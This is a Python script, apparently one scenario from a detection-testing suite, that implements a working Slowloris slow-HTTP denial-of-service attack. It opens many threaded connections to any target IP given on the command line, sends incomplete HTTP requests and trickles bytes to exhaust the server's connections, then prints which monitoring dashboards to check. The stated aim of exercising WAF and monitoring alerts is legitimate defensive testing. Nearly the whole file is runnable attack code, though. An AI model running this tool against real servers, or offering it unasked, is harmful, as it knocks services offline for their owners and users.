#!/usr/bin/env python3
"""
Scenario 9: Slowloris DDoS Attack (Slow HTTP)
- Difficulty: Advanced
- Detection: WAF, Prometheus, Netdata
- Expected Alert: Slow HTTP connection detected, resource exhaustion
"""

import sys
import argparse
import logging
import socket
import time
import threading

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class SlowlorisScenario:
    def __init__(self, target, port=80, duration=180, num_connections=50, verbose=False):
        self.target = target
        self.port = port
        self.duration = duration
        self.num_connections = num_connections
        self.verbose = verbose
        self.active_connections = 0
        self.total_sent = 0
        self.results = {
            'scenario': 'SLOWLORIS_DDOS',
            'target': target,
            'port': port,
            'duration': duration,
            'connections': 0,
            'status': 'pending'
        }

    def send_slow_http_request(self, connection_id):
        """Send slow HTTP request to keep connection open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, self.port))

            self.active_connections += 1
            logger.info(f"[+] Connection {connection_id}: Established")

            # Send HTTP request header slowly
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: Slowloris\r\n"
            request += "Content-Length: 999999\r\n"

            sock.send(request.encode())
            self.total_sent += len(request)

            start_time = time.time()
            while time.time() - start_time < self.duration:
                try:
                    # Send data slowly to keep connection open
                    sock.send(b"X")
                    self.total_sent += 1
                    time.sleep(1)  # Slow transmission rate
                except Exception:
                    break

            sock.close()
            self.active_connections -= 1
            logger.info(f"[+] Connection {connection_id}: Closed")

        except Exception as e:
            if self.verbose:
                logger.warning(f"[-] Connection {connection_id} error: {e}")
            self.active_connections -= 1

    def launch_attack(self):
        """Launch Slowloris attack"""
        logger.info(f"[*] Starting Slowloris DDoS against {self.target}:{self.port}")
        logger.info(f"[*] Duration: {self.duration}s")
        logger.info(f"[*] Concurrent Connections: {self.num_connections}")

        start_time = time.time()
        threads = []

        try:
            # Create connection threads
            for i in range(self.num_connections):
                thread = threading.Thread(
                    target=self.send_slow_http_request,
                    args=(i + 1,)
                )
                thread.daemon = True
                thread.start()
                threads.append(thread)
                time.sleep(0.5)  # Stagger connection creation

            # Monitor active connections
            while time.time() - start_time < self.duration:
                logger.info(f"[*] Active connections: {self.active_connections}")
                time.sleep(5)

            # Wait for threads to complete
            for thread in threads:
                thread.join(timeout=1)

        except KeyboardInterrupt:
            logger.info("\n[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        elapsed = time.time() - start_time
        self.results['connections'] = self.num_connections
        self.results['duration'] = elapsed
        self.results['bytes_sent'] = self.total_sent
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log attack results"""
        logger.info("\n" + "="*60)
        logger.info("SLOWLORIS DDoS RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}:{self.port}")
        logger.info(f"Concurrent Connections: {self.num_connections}")
        logger.info(f"Total Bytes Sent: {self.total_sent}")
        logger.info(f"Duration: {self.results.get('duration', 0):.2f}s")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - WAF: Check Slowloris/slow HTTP detection")
        logger.info("  - Prometheus: Monitor active connections spike")
        logger.info("  - Grafana: Check web server resource dashboard")
        logger.info("  - Netdata: Monitor CPU and memory on web server")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='Slowloris DDoS Attack Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 09_slowloris_ddos.py --target 10.10.10.10 --duration 180
  python 09_slowloris_ddos.py --target 192.168.1.100 --connections 100 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--duration', type=int, default=180, help='Attack duration in seconds')
    parser.add_argument('--connections', type=int, default=50, help='Number of concurrent connections')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    scenario = SlowlorisScenario(
        target=args.target,
        port=args.port,
        duration=args.duration,
        num_connections=args.connections,
        verbose=args.verbose
    )

    scenario.launch_attack()

if __name__ == '__main__':
    main()
